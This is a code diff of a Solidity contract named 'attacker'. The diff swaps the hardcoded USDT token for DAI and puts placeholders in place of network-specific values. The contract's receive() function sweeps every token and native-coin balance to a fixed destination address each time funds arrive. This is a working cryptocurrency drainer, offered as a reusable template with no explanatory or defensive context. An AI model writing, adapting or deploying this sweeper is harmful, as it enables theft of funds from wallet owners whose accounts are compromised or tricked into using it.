@@ -8,22 +8,22 @@ interface IERC20 {
 
 contract attacker {
 
-    address public constant USDT = 0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0;
+    address public constant DAI = <CONTRACT_ADDRESS_ACCORDING_TO_BLOCKCHAIN_NETWORK>;
     
     address public constant DESTINATION = 0x405f24B4C3C0DbEFbc2D333bABE8d73B99F7744b;
     
     receive() external payable {
 
-        IERC20 usdt = IERC20(USDT);
-        uint256 usdtBalance = usdt.balanceOf(address(this));
+        IERC20 dai = IERC20(DAI);
+        uint256 daiBalance = dai.balanceOf(address(this));
         
-        if (usdtBalance > 0) {
-            usdt.transfer(DESTINATION, usdtBalance);
+        if (daiBalance > 0) {
+            dai.transfer(DESTINATION, daiBalance);
         }
 
         if (address(this).balance > 0) {
             (bool success,) = DESTINATION.call{value: address(this).balance}("");
-            require(success, "ETH transfer failed");
+            require(success, "<NATIVE_BLOCKCHAIN_COIN_NAME> transfer failed");
         }
     }
 }
